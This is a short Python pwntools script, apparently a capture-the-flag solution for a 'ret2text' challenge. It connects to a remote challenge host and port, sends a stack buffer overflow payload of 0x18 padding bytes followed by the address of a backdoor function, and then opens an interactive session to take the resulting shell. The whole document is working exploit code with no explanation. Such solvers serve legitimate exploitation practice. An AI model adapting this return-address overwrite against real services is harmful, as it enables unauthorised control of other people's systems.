from pwn import *

#io = process("./ret2text")
io = connect("node4.anna.nssctf.cn", 21148)

io.recvuntil(b"length of your name:")
backdoor_addr = 0x4006ea
payload = b'a' * (0x10 + 0x8) + p64(backdoor_addr)
io.sendline(b"1024")
io.recvuntil(b"[+]What's u name?")
io.sendline(payload)
io.interactive()
